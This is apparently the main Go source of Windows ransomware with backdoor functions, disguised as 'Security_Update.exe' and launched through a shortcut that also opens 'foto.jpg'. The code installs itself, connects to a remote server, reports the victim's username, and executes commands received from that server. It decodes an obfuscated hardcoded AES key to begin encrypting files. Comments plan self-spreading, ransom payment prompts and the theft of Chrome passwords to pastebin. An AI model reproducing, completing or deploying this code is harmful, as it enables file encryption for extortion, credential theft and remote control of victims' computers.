//go:generate goversioninfo -icon=icon.ico
//Compile: go build -ldflags "-s -w -H=windowsgui"

//Shortcut: C:\Windows\System32\cmd.exe /C foto.jpg && rolling-win.exe

package main

import (
	"crypto/rand"
	"fmt"
	"strings"

	"./aes"
	"./base64"
	"./install"
	"./instances"
	"./network"
	"./utils"
)

// TargetFileName is the name taken by the Program
const TargetFileName = "Security_Update.exe" // check name Wscript.exe

var key_text []byte

func main() {
	//Check if already running
	instances.CheckMultiInstances()
	install.Install()
	//go Spread()
	network.Connect()
	network.Send("user", utils.GetUsername())
	go ListenAndExecute()
	go network.Reconnect()

	//SendData("Ok from client using cap'p")

	/*if ReadRegDone() {
		//Already encrypted
		PromtPay()
		ListenForPayment()
	}*/

	//Run Analytics
	//Put name, IP and status to pastebin

	//Send chrome pass to pastebin

	//Gen aes key
	b := make([]byte, 36)
	_, err := rand.Read(b)
	if err != nil {
		fmt.Println("error:", err)
		return
	}
	fmt.Println(b)

	//Gen
	//Deofuscate key
	b64_1 := "fSss" + "L1IkKy"
	b64_2 := "p3ZU4zR" + "3g5e"
	b64_3 := "ipMZy5" + "VYm13O"
	b64_4 := "Xg+WF" + "9jKnE="
	final := b64_1 + b64_2 + b64_3 + b64_4
	key_text = []byte(base64.Base64Decode(final))
	//When key decoded
	aes.InitializeBlock(key_text, TargetFileName)
	for {
	}
}

// ListenAndExecute recives commands and executes them
func ListenAndExecute() {
	for {
		status := network.Receive()
		go ParseProtocol(status)
	}

}

// ParseProtocol handles recived connections using legacy method
func ParseProtocol(r string) {
	commandBuff := strings.Split(r, " ")
	if len(commandBuff) > 1 {
		cmd := commandBuff[0]
		target := commandBuff[1]
		args := "null"
		if len(commandBuff) >= 3 {
			args = commandBuff[2]
		}
		//Concurrently executes command
		network.Execute(cmd, target, args)

	}
}
